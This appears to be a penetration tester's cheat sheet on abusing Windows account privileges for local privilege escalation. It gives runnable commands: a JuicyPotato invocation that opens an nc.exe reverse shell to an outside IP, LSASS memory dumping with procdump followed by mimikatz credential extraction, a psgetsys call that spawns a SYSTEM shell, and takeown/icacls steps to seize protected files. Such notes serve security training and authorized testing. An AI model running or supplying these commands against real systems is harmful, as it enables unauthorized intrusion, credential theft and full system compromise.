
# Exploiting Windows Privileges


[Cool POCs and plenty of good stuff](https://github.com/daem0nc0re/PrivFu/tree/main)

[Cool article with more info on user rights assignments](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment)

To show current user privileges, use the command `whoami /priv`. They can be edited via the local or domain group policy editor under  Computer Settings > Windows Settings > Security Settings > Local Policies > User Rights Assignments.

Often the privileges are present, but not enabled on an account. To remediate this, just use [this script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is explained in [this article](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/). 



## SeImpersonate and SeAssignPrimaryToken

This privilege can be exploited by "potato-style" privesc exploits, like [JuicyPotato](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato).

Usage :
```bat
JuicyPotato.exe -l <COM SERVER LISTENING PORT> -p <PROGRAM TO LAUNCH> -a <ARGUMENTS>
```

Example : Use nc.exe to call back to a listener :

```bat
\Tools\JuicyPotato.exe -l 53375 -p \windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.133 8443 -e cmd.exe" -t *
```


[More info on token impersonation attacks in Windows](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)



## SeDebugPrivilege

SeDebugPrivilege allows a user to debug program. <br> We can use this to dump a process memory, allowing us to recover password hashes in LSASS for example.

To dump a process memory, first download ProcDump from SysInternals then use the following command : 
`procdump.exe -accepteula -ma <process name> <dump name>`
then use this dump in mimikatz to extract the hashes :
- First load the dump using:  `sekurlsa::minidump lsass.dmp`
- Then extract the hashes using `sekurlsa::logonPasswords`
<br>

We can also leverage SeDebugPrivileges to elevate our privileges to SYSTEM using the parent process technique. 
SeDebugPrivilege allows us to alter a process to inherit the tokens of a parent process, if we target a system process, we inherit a SYSTEM token.   
For example, using [psgetsystem](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) : <br>
`psgetsys.ps1;[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`

You can use `tasklist` to get a PID or I suggest using Get-Process with a well known System process like so :
```ps1
.\psgetsys.ps1;[MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id, "C:\windows\system32\cmd.exe","")
```

## SeTakeOwnershipPrivilege

SeTakeOwnershipPrivilege grants the ability to take ownership of any [securable object](https://learn.microsoft.com/en-us/windows/win32/secauthz/securable-objects) like processes, files, registry keys, AD objects and such.

The [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) command allows us to take ownership of a file like this :
```bat
takeown /f "\path\to\File" 

# To take ownership of a directory (and all subdirs): 
takeown /f "\path\to\directory" \r \d y
```
It is possible that we are Owner of the file but still cannot access it, in this case, we can change the ACLs of the file to grant us full permissions over it like so :
```bat
icacls \path\to\file /grant username:F
``` 

